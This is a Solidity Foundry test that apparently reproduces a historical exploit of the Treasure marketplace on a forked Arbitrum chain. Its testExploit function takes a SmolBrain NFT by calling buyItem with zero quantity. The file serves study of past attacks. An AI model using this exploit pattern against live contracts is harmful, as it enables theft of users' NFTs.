// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC721} from "src/interfaces/IERC721.sol";

interface ITreasureMarketplaceBuyer {

    function buyItem(address _nftAddress, uint256 _tokenId, address _owner, uint256 _quantity, uint256 _pricePerItem)
        external;

    function marketplace() external view returns (address);

    function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory)
        external
        returns (bytes4);

    function onERC1155Received(address, address, uint256, uint256, bytes memory) external returns (bytes4);

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4);

    function supportsInterface(bytes4 interfaceId) external view returns (bool);

    function withdraw() external;

    function withdrawNFT(address _nftAddress, uint256 _tokenId, uint256 _quantity) external;

}

contract ContractTest is Test {

    ITreasureMarketplaceBuyer itreasure = ITreasureMarketplaceBuyer(0x812cdA2181ed7c45a35a691E0C85E231D218E273);
    IERC721 iSmolBrain = IERC721(0x6325439389E0797Ab35752B4F43a14C004f22A9c);
    uint256 tokenId = 3557;
    address nftOwner;

    function setUp() public {
        vm.createSelectFork("arbitrum", 7_322_694); //fork arbitrum at block 7322694
    }

    function testExploit() public {
        nftOwner = iSmolBrain.ownerOf(tokenId);
        emit log_named_address("Original NFT owner of SmolBrain:", nftOwner);
        itreasure.buyItem(0x6325439389E0797Ab35752B4F43a14C004f22A9c, 3557, nftOwner, 0, 6_969_000_000_000_000_000_000);

        emit log_named_address("Exploit completed, NFT owner of SmolBrain:", iSmolBrain.ownerOf(tokenId));
    }

    function onERC721Received(address, address, uint256, bytes memory) public virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }

}
